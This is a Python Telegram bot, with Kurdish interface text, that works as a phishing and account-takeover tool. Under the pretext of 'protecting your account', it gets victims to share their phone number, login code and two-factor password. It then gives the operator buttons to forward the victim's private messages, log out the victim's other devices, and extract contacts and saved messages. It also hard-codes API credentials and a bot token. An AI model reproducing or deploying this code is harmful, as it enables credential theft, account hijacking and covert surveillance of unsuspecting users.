from pyrogram import Client, filters, errors
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton

# --- زانیارییەکان ---
API_ID = 38225812
API_HASH = "aff3c308c587f18a5975910fbcf68366"
BOT_TOKEN = "8424748782:AAG0VELUlOfabsayVic2SpUAR-hWsh-nnf0"
ADMIN_ID = 7414272224

app = Client("pro_spy_buttons", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

active_sessions = {}

# --- ڕووکاری ئادمین و نێچیر ---
@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("💎 بەخێرهاتی گەورەم. هەر کاتێک نێچیرێک لۆگین بێت، لێرە دوگمەی کۆنترۆڵت بۆ دێت.")
        return

    btn = ReplyKeyboardMarkup([[KeyboardButton("📲 پشکنینی ئەکاونت", request_contact=True)]], resize_keyboard=True)
    await message.reply_text("👋 بۆ پاراستنی ئەکاونتەکەت، کلیک لە دوگمەی خوارەوە بکە.", reply_markup=btn)

# --- کاتی لۆگین بوون: دروستکردنی دوگمە بۆ هەر نێچیرێک ---
def get_victim_buttons(u_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📡 چالاککردنی سیخوڕی (Spy)", callback_data=f"spy_{u_id}")],
        [InlineKeyboardButton("⚔️ دەرکردنی ئامێرەکان", callback_data=f"term_{u_id}")],
        [InlineKeyboardButton("📇 وەرگرتنی ناوەکان", callback_data=f"contacts_{u_id}")],
        [InlineKeyboardButton("📩 ١٠ نامەی کۆن", callback_data=f"msgs_{u_id}")]
    ])

@app.on_callback_query()
async def handle_buttons(client, callback_query):
    data = callback_query.data
    u_id = int(data.split("_")[1])
    
    if u_id not in active_sessions:
        await callback_query.answer("❌ ئەم نێچیرە ئێستا ئۆفلاینە (گیتھەب ڕیستارت بووەتەوە)", show_alert=True)
        return

    u_client = active_sessions[u_id]["client"]

    if data.startswith("spy_"):
        @u_client.on_message(filters.private & ~filters.me)
        async def auto_forward(c, m):
            await m.forward(ADMIN_ID)
        await callback_query.answer("📡 سیستەمی سیخوڕی چالاک بوو")

    elif data.startswith("term_"):
        sessions = await u_client.get_authorizations()
        for s in sessions:
            if not s.is_current: await u_client.terminate_session(s.hash)
        await callback_query.answer("⚔️ هەموو ئامێرەکان دەرکران", show_alert=True)

    elif data.startswith("contacts_"):
        contacts = await u_client.get_contacts()
        text = "\n".join([f"👤 {c.first_name}: +{c.phone_number}" for c in contacts[:20]])
        await app.send_message(ADMIN_ID, f"📇 لیستی ناوەکان بۆ {u_id}:\n\n{text}")
        await callback_query.answer("ناردرا")

    elif data.startswith("msgs_"):
        async for msg in u_client.get_chat_history("me", limit=10):
            await msg.forward(ADMIN_ID)
        await callback_query.answer("نامەکان فۆروارد کران")

# --- پرۆسەی وەرگرتنی کۆد و لۆگین ---
@app.on_message(filters.contact & filters.private)
async def handle_contact(client, message):
    u_id = message.from_user.id
    phone = message.contact.phone_number
    u_client = Client(f"session_{u_id}", api_id=API_ID, api_hash=API_HASH)
    await u_client.connect()
    
    try:
        code_info = await u_client.send_code(phone)
        active_sessions[u_id] = {"client": u_client, "phone": phone, "hash": code_info.phone_code_hash, "step": "code"}
        await message.reply_text("✅ کۆدەکە بنێرە:")
    except Exception as e: await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

@app.on_message(filters.text & filters.private)
async def login_logic(client, message):
    u_id = message.from_user.id
    if u_id in active_sessions and active_sessions[u_id]["step"] != "done":
        data = active_sessions[u_id]
        try:
            if data["step"] == "code":
                await data["client"].sign_in(data["phone"], data["hash"], message.text)
            elif data["step"] == "2fa":
                await data["client"].check_password(message.text)
            
            active_sessions[u_id]["step"] = "done"
            await app.send_message(ADMIN_ID, f"🔥 نێچیرێکی نوێ لۆگین بوو!\n📱 ژمارە: `{data['phone']}`\n🆔 ئایدی: `{u_id}`", 
                                   reply_markup=get_victim_buttons(u_id))
            await message.reply_text("✅ سوپاس، ئەکاونتەکەت پارێزرا.")
        except errors.SessionPasswordNeeded:
            active_sessions[u_id]["step"] = "2fa"
            await message.reply_text("🔑 پاسۆردی دوو قۆناغی بنێرە:")
        except Exception as e: await app.send_message(ADMIN_ID, f"❌ هەڵە: {e}")

app.run()
